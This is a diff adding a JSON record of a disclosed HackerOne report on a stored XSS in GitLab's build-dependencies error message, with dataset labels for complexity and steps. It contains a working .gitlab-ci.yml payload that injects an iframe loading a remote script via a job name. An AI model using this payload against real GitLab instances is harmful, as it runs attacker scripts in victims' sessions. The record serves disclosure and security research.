@@ -1,0 +1,57 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "yvvdwf ",
+  "title": "Store-XSS in error message of build-dependencies ",
+  "content": "\nHi,\nA stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com disables the dependencies validation. However this feature is enable by default in self-managed installation.\nSteps to reproduce\nThe following steps should to be reproduced in a self-managed installation of gitlab\nCreate an empty project\nGo to \"Settings/CI/CD/Runners\" to setup a runner for this project\nCreate new file .gitlab-ci.yml for this project using the following content:\nCode 431 Bytes\n1test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:\n2  stage: build\n3  script: \n4    - date > index.html\n5  artifacts:\n6    paths: \n7      - index.html\n8    expire_in: 1 second\n9\n10job-test:\n11  stage: test\n12  script: echo \"hi\"\n13  dependencies: [\"test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>\"]\nWait for the jobs terminated, go to the detail of job-test\nYou should see an alert that contains the current url\nImpact\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side.\nFurthermore, by using <iframe> (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.\nWhat is the current bug behavior?\nThe failure_message has been considered as safe\nWhat is the expected correct behavior?\nThe failure_message should be sanitized.\nRelevant logs and/or screenshots\nPlease see a screenshot in attached file\nOutput of checks\nResults of GitLab environment info\n(For installations with omnibus-gitlab package run and paste the output of:\nsudo gitlab-rake gitlab:env:info)\nCode 832 Bytes\n1System information\n2System:\t\tUbuntu 18.04\n3Proxy:\t\tno\n4Current User:\tgit\n5Using RVM:\tno\n6Ruby Version:\t2.6.6p146\n7Gem Version:\t2.7.10\n8Bundler Version:1.17.3\n9Rake Version:\t12.3.3\n10Redis Version:\t5.0.9\n11Git Version:\t2.27.0\n12Sidekiq Version:5.2.9\n13Go Version:\tunknown\n14\n15GitLab information\n16Version:\t13.2.2-ee\n17Revision:\t618883a1f9d\n18Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter:\tPostgreSQL\n20DB Version:\t11.7\n21URL:\t\thttp://gl.local\n22HTTP Clone URL:\thttp://gl.local/some-group/some-project.git\n23SSH Clone URL:\tgit@gl.local:some-group/some-project.git\n24Elasticsearch:\tno\n25Geo:\t\tno\n26Using LDAP:\tno\n27Using Omniauth:\tyes\n28Omniauth Providers: \n29\n30GitLab Shell\n31Version:\t13.3.0\n32Repository storage paths:\n33- default: \t/var/opt/gitlab/git-data/repositories\n34GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n35Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side.\nFurthermore, by using <iframe> (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1606827840,
+  "report_url": "https://hackerone.com/reports/950190",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create an empty project in a self-managed GitLab installation"
+    ],
+    [
+      2,
+      "Go to 'Settings/CI/CD/Runners' to setup a runner for this project"
+    ],
+    [
+      3,
+      "Create a new file .gitlab-ci.yml with the provided malicious content"
+    ],
+    [
+      4,
+      "Wait for the jobs to terminate and go to the detail of job-test"
+    ],
+    [
+      5,
+      "Observe the alert containing the current URL, indicating the XSS execution"
+    ]
+  ],
+  "vuln_description": "A stored-XSS vulnerability exists in the error message of build-dependencies in GitLab's self-managed installations. The vulnerability allows an attacker to inject malicious JavaScript via a crafted job name in the .gitlab-ci.yml file, which is then executed when viewing the job details.",
+  "reason": "The attack involves crafting a specific .gitlab-ci.yml file with a malicious job name and understanding how GitLab processes dependencies and displays error messages. However, the steps are straightforward once the vulnerability vector is known, and the interaction between components is not particularly subtle or complex.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "831962",
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a stored XSS in the error message of build-dependencies, which is a client-side issue and not directly related to authentication or authorization boundaries. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which doesn't apply to this XSS vulnerability as it doesn't involve crossing such boundaries.",
+    "is_detectable": false
+  }
+}
